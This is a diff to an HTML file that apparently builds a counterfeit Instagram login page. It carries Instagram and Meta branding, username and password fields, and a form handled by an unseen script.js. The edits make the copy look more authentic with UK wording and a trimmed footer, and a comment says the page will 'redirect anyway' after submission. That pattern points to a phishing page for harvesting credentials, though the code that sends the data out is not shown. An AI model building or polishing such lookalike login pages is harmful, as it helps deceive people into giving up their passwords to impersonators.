@@ -9,50 +9,50 @@
 </head>
 <body>
   <div class="login-card">
+    <!-- Top language (English UK) -->
     <div class="top-lang">
-      <i class="fas fa-globe"></i> English (US)
+      <i class="fas fa-globe"></i> English (UK)
     </div>
+
+    <!-- Logo -->
     <div class="logo">
       <i class="fab fa-instagram"></i> Instagram
     </div>
 
+    <!-- Login Form -->
     <form id="loginForm">
-      <input type="text" id="username" placeholder="Username, email or mobile number" required />
+      <input type="text" id="username" placeholder="Username, email address or mobile number" required />
       <input type="password" id="password" placeholder="Password" required />
       <button type="submit" class="btn-login">Log in</button>
     </form>
 
-    <a href="#" class="forgot-link">Forgot password?</a>
+    <!-- Forgot password -->
+    <a href="#" class="forgot-link">Forgotten password?</a>
 
+    <!-- OR Divider -->
     <div class="divider">
       <span>OR</span>
     </div>
 
+    <!-- Create new account -->
     <p class="create-account">
       <a href="#">Create new account</a>
     </p>
 
+    <!-- Meta footer -->
     <div class="meta-footer">
       <i class="fab fa-meta"></i> Meta
     </div>
 
-    <div id="responseMsg" class="response" style="display:none;"></div>
-
+    <!-- Bottom bar: only Meta and instagram.com as shown -->
     <div class="bottom-bar">
-      <a href="#">Meta</a> <span class="dot">•</span>
-      <a href="#">About</a> <span class="dot">•</span>
-      <a href="#">Blog</a> <span class="dot">•</span>
-      <a href="#">Jobs</a> <span class="dot">•</span>
-      <a href="#">Help</a> <span class="dot">•</span>
-      <a href="#">API</a> <span class="dot">•</span>
-      <a href="#">Privacy</a> <span class="dot">•</span>
-      <a href="#">Terms</a> <span class="dot">•</span>
-      <a href="#">Locations</a> <span class="dot">•</span>
-      <a href="#">Instagram Lite</a> <span class="dot">•</span>
-      <a href="#">Threads</a> <span class="dot">•</span>
-      <a href="#">Contact Uploading &amp; Non-Users</a> <span class="dot">•</span>
-      <a href="#">Meta Verified</a>
+      <a href="#">Meta</a>
+      <span class="dot">•</span>
+      <a href="#">instagram.com</a>
     </div>
+
+    <!-- Hidden response div (for errors, but we'll redirect anyway) -->
+    <div id="responseMsg" class="response" style="display:none;"></div>
   </div>
 
   <script src="script.js"></script>
